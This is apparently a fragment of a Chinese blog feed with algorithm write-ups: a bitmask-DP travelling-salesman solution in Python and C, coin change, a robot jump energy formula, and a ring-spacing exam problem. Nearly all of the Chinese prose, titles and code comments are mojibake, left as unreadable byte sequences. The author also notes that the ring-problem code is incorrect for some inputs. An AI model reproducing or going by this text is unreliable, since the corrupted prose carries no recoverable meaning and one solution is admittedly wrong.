id="æ¯•ä¸šæ—…è¡Œé—®é¢˜">æ¯•ä¸šæ—…è¡Œé—®é¢˜</h2><p>å°æ˜ç›®å‰åœ¨åšä¸€ä»½æ¯•ä¸šæ—…è¡Œçš„è§„åˆ’ã€‚æ‰“ç®—ä»åŒ—äº¬å‡ºå‘ï¼Œåˆ†åˆ«å»è‹¥å¹²ä¸ªåŸå¸‚ï¼Œç„¶åå†å›åˆ°åŒ—äº¬ï¼Œæ¯ä¸ªåŸå¸‚ä¹‹é—´å‡ä¹˜åé«˜é“ï¼Œä¸”æ¯ä¸ªåŸå¸‚åªå»ä¸€æ¬¡ã€‚ç”±äºç»è´¹æœ‰é™ï¼Œå¸Œæœ›èƒ½å¤Ÿé€šè¿‡åˆç†çš„è·¯çº¿å®‰æ’å°½å¯èƒ½çš„çœä¸€äº›è·¯ä¸Šçš„èŠ±é”€ã€‚ç»™å®šä¸€ç»„åŸå¸‚å’Œæ¯å¯¹åŸå¸‚ä¹‹é—´çš„ç«è½¦ç¥¨çš„ä»·é’±ï¼Œæ‰¾åˆ°æ¯ä¸ªåŸå¸‚åªè®¿é—®ä¸€æ¬¡å¹¶è¿”å›èµ·ç‚¹çš„æœ€å°è½¦è´¹èŠ±é”€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ä¾‹å­ï¼š</span><br><span class="line">4</span><br><span class="line">0 2 6 5</span><br><span class="line">2 0 4 4</span><br><span class="line">6 4 0 2</span><br><span class="line">5 4 2 0</span><br><span class="line">è¾“å‡ºä¾‹å­ï¼š</span><br><span class="line">13</span><br><span class="line">ä¾‹å­è¯´æ˜ï¼š</span><br><span class="line">å…± 4 ä¸ªåŸå¸‚ï¼ŒåŸå¸‚ 1 å’ŒåŸå¸‚ 1 çš„è½¦è´¹ä¸º0ï¼ŒåŸå¸‚ 1 å’ŒåŸå¸‚ 2 ä¹‹é—´çš„è½¦è´¹ä¸º 2ï¼ŒåŸå¸‚ 1 å’ŒåŸå¸‚ 3 ä¹‹é—´çš„è½¦è´¹ä¸º 6ï¼ŒåŸå¸‚ 1 å’ŒåŸå¸‚ 4 ä¹‹é—´çš„è½¦è´¹ä¸º 5ï¼Œä¾æ¬¡ç±»æ¨ã€‚å‡è®¾ä»»æ„ä¸¤ä¸ªåŸå¸‚ä¹‹é—´å‡æœ‰å•ç¨‹ç¥¨å¯è´­ä¹°ï¼Œä¸”ç¥¨ä»·åœ¨1000å…ƒä»¥å†…ï¼Œæ— éœ€è€ƒè™‘æç«¯æƒ…å†µã€‚</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å¡äº†,æ‰¾chatgptå­¦äº†ä¸‹æ€è·¯,dp+bitmaskçš„æ€è·¯,è´´ä¸‹chatgptçš„ä»£ç  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">min_cost</span>(<span class="params">cost</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(cost)</span><br><span class="line">    <span class="comment"># dp[mask][i]è¡¨ç¤ºå·²ç»è®¿é—®è¿‡çš„åŸå¸‚é›†åˆä¸ºmaskï¼Œå¹¶ä¸”æœ€åä¸€æ¬¡è®¿é—®çš„åŸå¸‚æ˜¯iæ—¶çš„æœ€å°èŠ±è´¹</span></span><br><span class="line">    dp = [[<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; n)]</span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>  <span class="comment"># èµ·ç‚¹åˆ°è¾¾è‡ªå·±çš„èŠ±è´¹ä¸º0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> mask <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1</span> &lt;&lt; n):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> mask &amp; (<span class="number">1</span> &lt;&lt; i):  <span class="comment"># å¦‚æœç¬¬iä¸ªåŸå¸‚å·²ç»è®¿é—®è¿‡äº†</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                    <span class="keyword">if</span> i != j <span class="keyword">and</span> mask &amp; (<span class="number">1</span> &lt;&lt; j):  <span class="comment"># å¦‚æœç¬¬jä¸ªåŸå¸‚ä¹Ÿå·²ç»è®¿é—®è¿‡äº†</span></span><br><span class="line">                        dp[mask][i] = <span class="built_in">min</span>(dp[mask][i], dp[mask ^ (<span class="number">1</span> &lt;&lt; i)][j] + cost[j][i])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰¾åˆ°ä»ä»»æ„åŸå¸‚åˆ°è¾¾èµ·ç‚¹çš„æœ€å°èŠ±è´¹</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">min</span>(dp[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>][j] + cost[j][<span class="number">0</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹æµ‹è¯•</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cities = [<span class="string">&quot;åŒ—äº¬&quot;</span>, <span class="string">&quot;ä¸Šæµ·&quot;</span>, <span class="string">&quot;å¹¿å·&quot;</span>, <span class="string">&quot;æˆéƒ½&quot;</span>]</span><br><span class="line">    <span class="comment"># ä»¥äºŒç»´åˆ—è¡¨çš„å½¢å¼ç»™å‡ºæ¯å¯¹åŸå¸‚ä¹‹é—´çš„è½¦è´¹ï¼Œå¦‚æœä¸å¯è¾¾åˆ™ç”¨infè¡¨ç¤º</span></span><br><span class="line">    ticket_cost = [</span><br><span class="line">        [<span class="number">0</span>, <span class="number">500</span>, <span class="number">800</span>, <span class="number">1000</span>],</span><br><span class="line">        [<span class="number">500</span>, <span class="number">0</span>, <span class="number">600</span>, <span class="number">700</span>],</span><br><span class="line">        [<span class="number">800</span>, <span class="number">600</span>, <span class="number">0</span>, <span class="number">900</span>],</span><br><span class="line">        [<span class="number">1000</span>, <span class="number">700</span>, <span class="number">900</span>, <span class="number">0</span>]</span><br><span class="line">    ]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æœ€å°è½¦è´¹èŠ±é”€ä¸º:&quot;</span>, min_cost(ticket_cost))</span><br></pre></td></tr></table></figure></p><p>nä¸ªåŸå¸‚æœ‰2^nä¸ªçŠ¶æ€,ç”¨äºŒè¿›åˆ¶å¯ä»¥è¿›è¡Œè¡¨ç¤º,æœ€ç»ˆçŠ¶æ€ä½å…¨1,dpåˆ—è¡¨ä¸€ç»´è¡¨ç¤ºåˆ°è®¿è¿‡çš„åŸå¸‚æ©ç ,äºŒç»´è¡¨ç¤ºæœ€ååˆ°è¾¾çš„åŸå¸‚,å…¶å€¼è¡¨ç¤ºèƒ½æ»¡è¶³æ­¤æ¡ä»¶çš„æœ€ä½è·¯å¾„é•¿åº¦. æœ€ç»ˆéœ€è¦ä»åŸå¸‚å›èµ·ç‚¹,åœ¨è¿”å›æ—¶å†åŠ ä¸€å±‚åˆ¤æ–­å³å¯. ä»£ç æ²¡é—®é¢˜,ä¸è¿‡pythonæäº¤ä¹‹åä¼šTLE,æƒ³èµ·ä¹‹å‰å¯†ç å­¦ä¹Ÿæœ‰é¢˜pythonè¶…æ—¶æ¢cè¿‡äº†,äºæ˜¯ç”¨cé‡å†™äº†ä¸€ä¸‹,æˆåŠŸé€šè¿‡. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &lt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cost</span><span class="params">(<span class="type">int</span> *cost, <span class="type">int</span> cities)</span>&#123;</span><br><span class="line">    <span class="type">int</span> dp[<span class="number">1</span>&lt;&lt;cities][cities];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span>&lt;&lt;cities); i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; cities; j++)&#123;</span><br><span class="line">            dp[i][j] = MAX;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> mask = <span class="number">1</span>; mask &lt; (<span class="number">1</span>&lt;&lt;cities); mask++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cities; i++)&#123;</span><br><span class="line">            <span class="comment">// i is choosen</span></span><br><span class="line">            <span class="keyword">if</span>(mask &amp; (<span class="number">1</span> &lt;&lt; i))&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; cities; j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i != j &amp;&amp; mask &amp; (<span class="number">1</span> &lt;&lt; j))&#123;</span><br><span class="line">                        dp[mask][i] = min(dp[mask ^ (<span class="number">1</span> &lt;&lt; i)][j] + cost[j * cities + i], dp[mask][i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> min_cost = MAX;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; cities; k++)&#123;</span><br><span class="line">        min_cost = min(min_cost, dp[(<span class="number">1</span> &lt;&lt; cities) - <span class="number">1</span>][k] + cost[k * cities]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min_cost;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> cities;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;cities);</span><br><span class="line">    <span class="type">int</span> costs[cities][cities];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; cities; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j &lt; cities; j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;costs[i][j]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, cost(*costs, cities));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="æ‰¾é›¶">æ‰¾é›¶</h2><p>Zå›½çš„è´§å¸ç³»ç»ŸåŒ…å«é¢å€¼1å…ƒã€4å…ƒã€16å…ƒã€64å…ƒå…±è®¡4ç§ç¡¬å¸ï¼Œä»¥åŠé¢å€¼1024å…ƒçš„çº¸å¸ã€‚ç°åœ¨å°Yä½¿ç”¨1024å…ƒçš„çº¸å¸è´­ä¹°äº†ä¸€ä»¶ä»·å€¼ä¸º N(0 &lt; N&lt;=1024 )çš„å•†å“ï¼Œè¯·é—®æœ€å°‘ä»–ä¼šæ”¶åˆ°å¤šå°‘ç¡¬å¸ï¼Ÿ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ä¾‹å­ï¼š</span><br><span class="line">200</span><br><span class="line">è¾“å‡ºä¾‹å­ï¼š</span><br><span class="line">17</span><br><span class="line">ä¾‹å­è¯´æ˜ï¼š</span><br><span class="line">èŠ±200ï¼Œéœ€è¦æ‰¾é›¶824å—ï¼Œæ‰¾12ä¸ª64å…ƒç¡¬å¸ï¼Œ3ä¸ª16å…ƒç¡¬å¸ï¼Œ2ä¸ª4å…ƒç¡¬å¸å³å¯ã€‚</span><br></pre></td></tr></table></figure> æœ€åŸºç¡€çš„dp <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">paied = <span class="built_in">int</span>(sys.stdin.readline().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solution</span>(<span class="params">money</span>):</span><br><span class="line">    dp = [<span class="number">1024</span>] * <span class="number">1024</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1024</span>):</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">64</span>]:</span><br><span class="line">            dp[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">4</span>:</span><br><span class="line">            dp[i] = dp[i-<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">16</span>:</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>] + <span class="number">1</span>, dp[i-<span class="number">4</span>] + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">64</span>:</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>] + <span class="number">1</span>, dp[i-<span class="number">4</span>] + <span class="number">1</span>, dp[i-<span class="number">16</span>] + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>] + <span class="number">1</span>, dp[i-<span class="number">4</span>] + <span class="number">1</span>, dp[i-<span class="number">16</span>] + <span class="number">1</span>, dp[i-<span class="number">64</span>] + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> dp[money]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(solution(<span class="number">1024</span>-paied))</span><br></pre></td></tr></table></figure></p><h2 id="æœºå™¨äººè·³è·ƒé—®é¢˜">æœºå™¨äººè·³è·ƒé—®é¢˜</h2><p>æœºå™¨äººæ­£åœ¨ç©ä¸€ä¸ªå¤è€çš„åŸºäºDOSçš„æ¸¸æˆã€‚æ¸¸æˆä¸­æœ‰N+1åº§å»ºç­‘â€”â€”ä»0åˆ°Nç¼–å·ï¼Œä»å·¦åˆ°å³æ’åˆ—ã€‚ç¼–å·ä¸º0çš„å»ºç­‘é«˜åº¦ä¸º0ä¸ªå•ä½ï¼Œç¼–å·ä¸ºiçš„å»ºç­‘çš„é«˜åº¦ä¸ºH(i)ä¸ªå•ä½ã€‚</p><p>èµ·åˆï¼Œ æœºå™¨äººåœ¨ç¼–å·ä¸º0çš„å»ºç­‘å¤„ã€‚æ¯ä¸€æ­¥ï¼Œå®ƒè·³åˆ°ä¸‹ä¸€ä¸ªï¼ˆå³è¾¹ï¼‰å»ºç­‘ã€‚å‡è®¾æœºå™¨äººåœ¨ç¬¬kä¸ªå»ºç­‘ï¼Œä¸”å®ƒç°åœ¨çš„èƒ½é‡å€¼æ˜¯E, ä¸‹ä¸€æ­¥å®ƒå°†è·³åˆ°ç¬¬ä¸ªk+1å»ºç­‘ã€‚å®ƒå°†ä¼šå¾—åˆ°æˆ–è€…å¤±å»æ­£æ¯”äºä¸H(k+1)ä¸Eä¹‹å·®çš„èƒ½é‡ã€‚å¦‚æœ H(k+1) &gt; E é‚£ä¹ˆæœºå™¨äººå°±å¤±å» H(k+1) - E çš„èƒ½é‡å€¼ï¼Œå¦åˆ™å®ƒå°†å¾—åˆ° E - H(k+1) çš„èƒ½é‡å€¼ã€‚</p><p>æ¸¸æˆç›®æ ‡æ˜¯åˆ°è¾¾ç¬¬ä¸ªNå»ºç­‘ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œèƒ½é‡å€¼ä¸èƒ½ä¸ºè´Ÿæ•°ä¸ªå•ä½ã€‚ç°åœ¨çš„é—®é¢˜æ˜¯æœºå™¨äººä»¥å¤šå°‘èƒ½é‡å€¼å¼€å§‹æ¸¸æˆï¼Œæ‰å¯ä»¥ä¿è¯æˆåŠŸå®Œæˆæ¸¸æˆï¼Ÿ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ä¾‹å­ï¼š</span><br><span class="line">5</span><br><span class="line">3 4 3 2 4</span><br><span class="line">è¾“å‡ºä¾‹å­ï¼š</span><br><span class="line">4</span><br><span class="line">----------------</span><br><span class="line">è¾“å…¥ä¾‹å­ï¼š</span><br><span class="line">3</span><br><span class="line">4 4 4</span><br><span class="line">è¾“å‡ºä¾‹å­ï¼š</span><br><span class="line">4</span><br><span class="line">----------------</span><br><span class="line">è¾“å…¥ä¾‹å­ï¼š</span><br><span class="line">3</span><br><span class="line">1 6 4</span><br><span class="line">è¾“å‡ºä¾‹å­ï¼š</span><br><span class="line">3</span><br></pre></td></tr></table></figure></p><p>æè¿°éå¸¸è¯¡å¼‚,ä¸è¿‡å…¶å®æ˜¯ä¸ªæ•°å­¦é—®é¢˜ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1: X&gt;0</span><br><span class="line">2: X+(X-H1) &gt; 0                               </span><br><span class="line">3: X+(X-H1)+(2X-H1-H2) &gt; 0</span><br><span class="line">4: X+(X-H1)+(2X-H1-H2)+(4X-2H1-H2-H3) &gt; 0</span><br><span class="line"></span><br><span class="line">åŒ–ç®€ä¹‹å</span><br><span class="line">1:  X&gt;0</span><br><span class="line">2: 2X&gt;H1</span><br><span class="line">3: 4X&gt;2H1+H2</span><br><span class="line">4: 8X&gt;4H1+2H2+H3</span><br></pre></td></tr></table></figure> æ‰€ä»¥åé¢æ»¡è¶³å‰é¢ä¸€å®šæ»¡è¶³</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">count = <span class="built_in">int</span>(sys.stdin.readline().strip())</span><br><span class="line">heights = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, sys.stdin.readline().strip().split(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solution</span>(<span class="params">h</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, count):</span><br><span class="line">        h[i] = h[i-<span class="number">1</span>] * <span class="number">2</span> + h[i]</span><br><span class="line">    <span class="keyword">return</span> math.ceil(h[-<span class="number">1</span>]/ (<span class="number">1</span>&lt;&lt;count))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(solution(heights))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æŸå‚ç®—æ³•ç¬”è¯•è®°å½•</title>
      <link href="/2023/08/21/%E6%9F%90%E5%8E%82%E7%AE%97%E6%B3%95%E7%AC%94%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/08/21/%E6%9F%90%E5%8E%82%E7%AE%97%E6%B3%95%E7%AC%94%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡è¿œç¨‹ç¬”è¯•,æœ¬æ¥æ˜¯ä»¥ä¸ºleetcodeç±»ä¼¼,ç»“æœå’Œé¢„æƒ³çš„æœ‰ç‚¹å·®åˆ«,ç„¶åæµ‹è¯•ç”¨ä¾‹å’Œleetcodeä¹Ÿä¸å¤ªä¸€æ ·,æ ·ä¾‹è¾“å…¥ä¹Ÿä¸å¤ªç›¸ä¼¼, åšçš„å¾ˆä¸ç†æƒ³. å¤§è‡´è®°å½•ä¸‹, é¢˜ç›®è®°å¾—ä¸æ˜¯å¾ˆæ¸…æ¥šåªèƒ½å¤§æ¦‚å†™ä¸‹.</p><h2 id="ä½¿ç¯ä¸Šä¸‰ç‚¹ä¸­ä»»æ„ä¸¤ç‚¹è·ç¦»å¤§äºk">ä½¿ç¯ä¸Šä¸‰ç‚¹ä¸­ä»»æ„ä¸¤ç‚¹è·ç¦»å¤§äºk</h2><p>è¾“å…¥æ ¼å¼: n, k, a1, a2, a3 nä¸ºç¯ä¸Šç‚¹çš„ä¸ªæ•° kä¸ºé—´è·å¤§å° a1, a2, a3ä¸ºæŒ‡å®šç‚¹çš„ä½ç½®,èŠ‚ç‚¹ä¸€æ¬¡åªèƒ½åŠ¨ä¸€æ¬¡,è¾“å‡ºæœ€å°‘éœ€è¦çš„ç§»åŠ¨æ¬¡æ•°</p><p>æ¯”å¦‚6, 2, 1, 2, 3. æˆ‘ä»¬éœ€è¦å°†èŠ‚ç‚¹1å¾€å·¦ç§»åŠ¨ä¸€æ¬¡,èŠ‚ç‚¹3å¾€å³ä¸€æ¬¡å³å¯æ»¡è¶³,æ€»å…±ç§»åŠ¨2æ¬¡,æ‰€ä»¥åº”è¯¥è¿”å›2</p><p>ç¬”è¯•çš„æ—¶å€™æƒ³æ³•æ˜¯å–ä¸‰ç‚¹ä»»ä¸¤ç‚¹ä¸­è·ç¦»ä¸­æœ€å°çš„ä¸¤ç»„, ä»è€Œç¡®å®šæœ€ä½éœ€è¦çš„æ¬¡æ•°, ä»£ç å¦‚ä¸‹. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">least_move</span>(<span class="params">n, k, a1, a2, a3</span>):</span><br><span class="line">    <span class="comment"># æ’é™¤ä¸æ»¡è¶³çš„</span></span><br><span class="line">    <span class="keyword">if</span> n // <span class="number">3</span> &lt; k:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è€ƒè™‘ç¯é¦–å°¾ç›¸è¿</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">distance</span>(<span class="params">a, b</span>):</span><br><span class="line">        abs_v = <span class="built_in">abs</span>(a - b)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(abs_v, <span class="built_in">abs</span>(n - abs_v))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    d = [distance(a1, a2), distance(a1, a3), distance(a2, a3)]</span><br><span class="line">    d.sort()</span><br><span class="line">    d.pop()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æœ€è¿‘çš„ä¸¤ç»„éƒ½æ»¡è¶³, è¿”å›0</span></span><br><span class="line">    <span class="keyword">if</span> d[<span class="number">0</span>] &gt;= k <span class="keyword">and</span> d[<span class="number">1</span>] &gt;= k:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># æœ€è¿‘çš„ä¸¤ç»„éƒ½éœ€ç§»åŠ¨åˆ°kè·ç¦»</span></span><br><span class="line">    <span class="keyword">elif</span> d[<span class="number">0</span>] &lt; k <span class="keyword">and</span> d[<span class="number">1</span>] &lt; k:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * k - d[<span class="number">0</span>] - d[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¸€ç»„å¤§äºk, ä¸€ç»„å°äºk, å…ˆç§»åŠ¨ä¸­é—´å†è€ƒè™‘ç§»åŠ¨å°äºkä¾§</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        larger = <span class="built_in">max</span>(d)</span><br><span class="line">        less = <span class="built_in">min</span>(d)</span><br><span class="line">        <span class="comment"># k - less ä¸ºä¸­é—´ç‚¹ç§»å‘large,ç›´åˆ°è·ç¦»largeä¸ºkè¿˜ä¸æ»¡è¶³åªèƒ½ç§»åŠ¨less</span></span><br><span class="line">        <span class="comment"># åè€…ä¸ºä¸­é—´ç‚¹ç§»å‘largeè¿‡ç¨‹ä¸­å°±æ»¡è¶³äº†</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(k - less, k - less - (larger - k))</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(least_move(12, 4, 1, 2, 7))</span></span><br><span class="line"><span class="comment"># åº”è¯¥æ˜¯3, 2å¾€å³1æ¬¡, 1å¾€å·¦2æ¬¡</span></span><br></pre></td></tr></table></figure></p><h2 id="åŒèŠ±é¡º">åŒèŠ±é¡º</h2><p>ç»™ä¸€å †è¾“å…¥, æ£€æµ‹å…¶ä¸­çš„åŒèŠ±é¡º(ä»…5å¼ ), 